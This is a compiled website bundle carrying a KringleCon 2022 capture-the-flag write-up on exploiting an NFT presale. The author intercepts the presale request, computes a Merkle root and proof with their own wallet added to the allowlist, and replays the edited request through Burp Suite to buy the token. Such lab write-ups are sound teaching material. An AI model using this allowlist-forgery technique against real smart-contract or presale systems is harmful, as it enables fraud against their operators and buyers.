"use strict";(self.webpackChunkkringlecon_2022=self.webpackChunkkringlecon_2022||[]).push([[6925],{3905:(e,t,a)=>{a.d(t,{Zo:()=>d,kt:()=>f});var n=a(7294);function r(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function o(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function l(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?o(Object(a),!0).forEach((function(t){r(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):o(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function i(e,t){if(null==e)return{};var a,n,r=function(e,t){if(null==e)return{};var a,n,r={},o=Object.keys(e);for(n=0;n<o.length;n++)a=o[n],t.indexOf(a)>=0||(r[a]=e[a]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)a=o[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(r[a]=e[a])}return r}var c=n.createContext({}),s=function(e){var t=n.useContext(c),a=t;return e&&(a="function"==typeof e?e(t):l(l({},t),e)),a},d=function(e){var t=s(e.components);return n.createElement(c.Provider,{value:t},e.children)},p={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},u=n.forwardRef((function(e,t){var a=e.components,r=e.mdxType,o=e.originalType,c=e.parentName,d=i(e,["components","mdxType","originalType","parentName"]),u=s(a),f=r,b=u["".concat(c,".").concat(f)]||u[f]||p[f]||o;return a?n.createElement(b,l(l({ref:t},d),{},{components:a})):n.createElement(b,l({ref:t},d))}));function f(e,t){var a=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=a.length,l=new Array(o);l[0]=u;var i={};for(var c in t)hasOwnProperty.call(t,c)&&(i[c]=t[c]);i.originalType=e,i.mdxType="string"==typeof e?e:r,l[1]=i;for(var s=2;s<o;s++)l[s]=a[s];return n.createElement.apply(null,l)}return n.createElement.apply(null,a)}u.displayName="MDXCreateElement"},2076:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>c,contentTitle:()=>l,default:()=>p,frontMatter:()=>o,metadata:()=>i,toc:()=>s});var n=a(7462),r=(a(7294),a(3905));const o={sidebar_position:3},l="Exploit a Smart Contract",i={unversionedId:"objectives/BurningRing/exploit_a_smart_contract",id:"objectives/BurningRing/exploit_a_smart_contract",title:"Exploit a Smart Contract",description:"Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.",source:"@site/docs/objectives/BurningRing/exploit_a_smart_contract.md",sourceDirName:"objectives/BurningRing",slug:"/objectives/BurningRing/exploit_a_smart_contract",permalink:"/docs/objectives/BurningRing/exploit_a_smart_contract",draft:!1,tags:[],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3},sidebar:"tutorialSidebar",previous:{title:"Blockchain Divination",permalink:"/docs/objectives/BurningRing/blockchain_divination"},next:{title:"Finale",permalink:"/docs/objectives/finale"}},c={},s=[{value:"Set up QPetabyte&#39;s Merkle Trees tool",id:"set-up-qpetabytes-merkle-trees-tool",level:2},{value:"Setup merkle_tree.py script",id:"setup-merkle_treepy-script",level:3},{value:"HTTP Post validate adress on list",id:"http-post-validate-adress-on-list",level:3},{value:"Prepaying",id:"prepaying",level:3},{value:"Paying for NFT",id:"paying-for-nft",level:3}],d={toc:s};function p(e){let{components:t,...o}=e;return(0,r.kt)("wrapper",(0,n.Z)({},d,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"exploit-a-smart-contract"},"Exploit a Smart Contract"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.")),(0,r.kt)("h1",{id:"check-if-my-wallet-is-on-the-approval-list"},"Check if my wallet is on the approval list"),(0,r.kt)("p",null,"The very first thing I did was to verify if my wallet was on the approval list by using this GUI and sniffing the request."),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Approval list",src:a(9284).Z,width:"1237",height:"675"})),(0,r.kt)("p",null,"The request sniffed through Burp Suite looked something like this: "),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'POST /cgi-bin/presale HTTP/2\nHost: boredsporcrowboatsociety.com\nContent-Length: 169\nSec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"\nSec-Ch-Ua-Platform: "Linux"\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54\nContent-Type: application/json\nAccept: */*\nOrigin: https://boredsporcrowboatsociety.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://boredsporcrowboatsociety.com/presale.html?&challenge=bsrs&username=reedphish&id=a0d0db21-aeba-4c63-ba57-e65159240fc3&area=level5&location=15,15&tokens=bsrs\nAccept-Encoding: gzip, deflate\nAccept-Language: nb,no;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,da;q=0.5\n\n{ \n    "WalletID":"",\n    "Root":"0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1",\n    "Proof":"",\n    "Validate":"true",\n    "Session":"f813731a-dd84-4188-ae18-df23149cdbc2"\n}\n')),(0,r.kt)("p",null,"I need this one for later so better keep it! "),(0,r.kt)("h2",{id:"set-up-qpetabytes-merkle-trees-tool"},"Set up QPetabyte's Merkle Trees tool"),(0,r.kt)("p",null,"In order to solve this objective I need to obtain and install a Merkle Tree tool:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"git clone https://github.com/QPetabyte/Merkle_Trees\ncd Merkle_Trees\ndocker build -t merkletrees .\ndocker run -it --rm --name=merkletrees merkletrees\n")),(0,r.kt)("h3",{id:"setup-merkle_treepy-script"},"Setup merkle_tree.py script"),(0,r.kt)("p",null,"This script needs a list of wallets to put on the allowlist in order to calculate the root value. My theory is that I put my wallet ID in as the first entry and then fill up with addresses found on the NFT gallery page (in file merkle_tree.py) : "),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'# allowlist = [\'0x1337133713371337133713371337133713371337\',\'0x0000000000000000000000000000000000000000\']\n\nallowlist = [\n    "0xB32428966dcDAF5F4C6715492EB1871971db1D9B",\n    "0xa1861E96DeF10987E1793c8f77E811032069f8E9",\n    "0xb9aA688bB7A1B085f307bf9a11790BFD24C5D5C2",\n    "0xc249927fb81bde4eA7B9Dc9e4c9E6F503F147fe2",\n    "0x8153e0E5cabC22545A1fe4d0149C2Fdc486A8ad8",\n    "0x7F7cAA97b73fD38d6740e59C159428509eE00082",\n    "0x214Fee463D58D21954e75bdD93c386414e71A985",\n]\n')),(0,r.kt)("p",null,"I renamed ",(0,r.kt)("strong",{parentName:"p"},"merkle_tree_new.py")," to ",(0,r.kt)("strong",{parentName:"p"},"merkle_tree_new.py")," for this writeup."),(0,r.kt)("p",null,"Then ran the tool:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'$ python3 merkle_tree_new.py \n\nRoot: 0x6394202d86193e1238566ddbe62f3b193f9122f746b6c281a13096a2b41aaeed\n"0x0eeb229810d8a228636f88aa5ca05da0dbdeef0724017e8a81d06102aeacd974,0x78f9dc3d11e163c5302eb40c168a191888654297aaacf51bcddd089879f7f4ea,0xce8e5c755c18839416c96c002602346ba00220d2c35d77a674c7145a230419c5"\n')),(0,r.kt)("h3",{id:"http-post-validate-adress-on-list"},"HTTP Post validate adress on list"),(0,r.kt)("p",null,"I used BurpSuite proxy for this and Repated the sniffed POST request from earlier once edited with correct values:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"My wallet ID"),(0,r.kt)("li",{parentName:"ul"},"Proof string from Merkle Tree tool")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'{\n    "WalletID":"0xB32428966dcDAF5F4C6715492EB1871971db1D9B",\n    "Root":"0x6394202d86193e1238566ddbe62f3b193f9122f746b6c281a13096a2b41aaeed",\n    "Proof": "0x0eeb229810d8a228636f88aa5ca05da0dbdeef0724017e8a81d06102aeacd974,0x78f9dc3d11e163c5302eb40c168a191888654297aaacf51bcddd089879f7f4ea,0xce8e5c755c18839416c96c002602346ba00220d2c35d77a674c7145a230419c5",\n    "Validate":"true",\n    "Session":"f813731a-dd84-4188-ae18-df23149cdbc2"\n}\n')),(0,r.kt)("p",null,"Got the following feedback from server"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'{"Response": "You\'re on the list and good to go! Now... BUY A SPORC!"}\n')),(0,r.kt)("h3",{id:"prepaying"},"Prepaying"),(0,r.kt)("p",null,"Setting up the prepayment is just the same as in the buy a hat objective. Walk over to the teller:"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Teller machine",src:a(6703).Z,width:"480",height:"270"})),(0,r.kt)("p",null,"Approve a KringleCoin Transfer:"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Teller menu",src:a(4621).Z,width:"761",height:"422"})),(0,r.kt)("p",null,"Fill out the details:"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Preparing payment",src:a(1572).Z,width:"760",height:"732"})),(0,r.kt)("p",null,"Transaction approved!"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Payment done",src:a(5718).Z,width:"760",height:"732"})),(0,r.kt)("h3",{id:"paying-for-nft"},"Paying for NFT"),(0,r.kt)("p",null,'Reusing the HTTP POST request as used in "HTTP Post validate address on list", but altering parameter "Validate" to "false" (still using BurpSuite):'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'{\n    "WalletID":"0xB32428966dcDAF5F4C6715492EB1871971db1D9B",\n    "Root":"0x6394202d86193e1238566ddbe62f3b193f9122f746b6c281a13096a2b41aaeed",\n    "Proof": "0x0eeb229810d8a228636f88aa5ca05da0dbdeef0724017e8a81d06102aeacd974,0x78f9dc3d11e163c5302eb40c168a191888654297aaacf51bcddd089879f7f4ea,0xce8e5c755c18839416c96c002602346ba00220d2c35d77a674c7145a230419c5",\n    "Validate":"false",\n    "Session":"f813731a-dd84-4188-ae18-df23149cdbc2"\n}\n')),(0,r.kt)("p",null,"Response:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python"},'{\n    "Response": "Success! You are now the proud owner of BSRS Token #000234. You can find more information at https://boredsporcrowboatsociety.com/TOKENS/BSRS234, or check it out in the gallery!<br>Transaction: 0x4cd5d6458d1c1a430c07e410a58f79d660125ff8f2e9ab2032aa9be2112ad6b3, Block: 69095<br><br>Remember: Just like we planned, tell everyone you know to <u><em>BUY A BoredSporc</em></u>.<br>When general sales start, and the humans start buying them up, the prices will skyrocket, and we all sell at once!<br><br>The market will tank, but we\'ll all be rich!!!"}\n')),(0,r.kt)("p",null,"Apparently I bought this NFT:"),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"My NFT",src:a(9684).Z,width:"640",height:"900"})))}p.isMDXComponent=!0},9684:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/BSRS234-5d59bab8b8cfb84329c1c1a72481e55a.png"},6703:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/smart-contract-1-3b46490b52304c7e5b6ea84aeae7a4ef.png"},4621:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/smart-contract-2-d7b8942e41497edd4b87dfc5cf4140a3.png"},1572:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/smart-contract-3-b94ae0a5ba28e6650e2f2429b72156da.png"},5718:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/smart-contract-4-6d8a823d726a02a86ccdb80f7f96b934.png"},9284:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/validate-on-list-6f22ced9890b8a122bb8e9a574521367.png"}}]);